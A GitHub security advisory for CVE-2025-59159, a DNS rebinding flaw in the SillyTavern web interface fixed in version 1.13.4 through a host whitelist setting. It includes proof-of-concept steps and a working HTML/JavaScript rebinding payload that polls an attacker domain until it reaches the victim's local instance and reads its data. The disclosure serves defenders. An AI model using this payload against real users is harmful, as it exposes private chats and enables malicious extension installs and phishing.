# [C] SillyTavern Web Interface Vulnerable DNS Rebinding

## Summary
Severity: Critical
Advisory: GHSA-7cxj-w27x-x78q
CVE: CVE-2025-59159
CWE: CWE-346, CWE-940
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2025-10-06
Source: https://github.com/advisories/GHSA-7cxj-w27x-x78q
Type: github-advisory

## Affected
- npm: `sillytavern` — affected >=0 <1.13.4

## Details
### Summary
The web UI for SillyTavern is susceptible to DNS rebinding, allowing attackers to perform actions like install malicious extensions, read chats, inject arbitrary HTML for phishing, etc.

### Details
DNS rebinding is a method to bypass the CORS policies by tricking the browser into resolving something like `127.0.0.1` for a site's DNS address. This allows anybody to get remote access to anyone's SillyTavern instance **without** it being exposed, just by visiting a website. 

### PoC
1. Host the PoC HTML file on a `/rebind.html` endpoint (or any other endpoint) on a web server on port 8000
2. Go to https://lock.cmpxchg8b.com/rebinder.html and input your IP address (A) to rebind to 127.0.0.1 (B)
3. Replace the URL in the HTML with the returned URL on the site
4. Go to `http://[URL]:8000/rebind.html` in firefox or on any mobile browser if you're using termux
5. Check the developer tools console. It should return all of the data 

Here is the PoC code:

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Rebind Payload</title>
</head>
<body>
<script>
async function tryRebind() {
  while (true) {
    try {
      let res = await fetch("http://[DOMAIN HERE]:8000/");
      let text = await res.text();

      if (text.includes("Directory listing for /")) {
        console.log("Still attacker server, retrying...");
        await new Promise(r => setTimeout(r, 2000));
        continue;  // don't break yet
      }

      console.log("GOT VICTIM RESPONSE!");
      console.log(text.substring(0, 300));
      break;

    } catch (e) {
      console.log("Fetch failed, retrying...", e);
      await new Promise(r => setTimeout(r, 2000));
    }
  }
}
tryRebind();
</script>
</body>
</html>
```

### Impact
Attackers can read user chats, inject HTML for stuff like phishing, download arbitrary malicious extensions, etc. Essentially gaining full control over users' SillyTavern systems. 

### Resolution
A vulnerability has been patched in the version 1.13.4 by introducing a server configuration setting that enables a validation of host names in inbound HTTP requests according to the provided list of allowed hosts: `hostWhitelist.enabled` in config.yaml file or `SILLYTAVERN_HOSTWHITELIST_ENABLED` environment variable.

While the setting is disabled by default to honor a wide variety of existing user configurations and maintain backwards compatibility, existing and new users are encouraged to review their server configurations and apply necessary changes to their setup, especially if hosting over the local network while not using SSL.

- [Documentation](https://docs.sillytavern.app/administration/config-yaml/#host-whitelisting)
- [Security checklist](https://docs.sillytavern.app/administration/#security-checklist)

### Resources
- https://github.com/SillyTavern/SillyTavern/commit/d134abd50e4a416e3b81233242583b0a23f38320

## References
- https://github.com/SillyTavern/SillyTavern/security/advisories/GHSA-7cxj-w27x-x78q
- https://nvd.nist.gov/vuln/detail/CVE-2025-59159
- https://github.com/SillyTavern/SillyTavern/commit/d134abd50e4a416e3b81233242583b0a23f38320
- https://docs.sillytavern.app/administration/#security-checklist
- https://docs.sillytavern.app/administration/config-yaml/#host-whitelisting
- https://github.com/SillyTavern/SillyTavern
- https://github.com/SillyTavern/SillyTavern/releases/tag/1.13.4
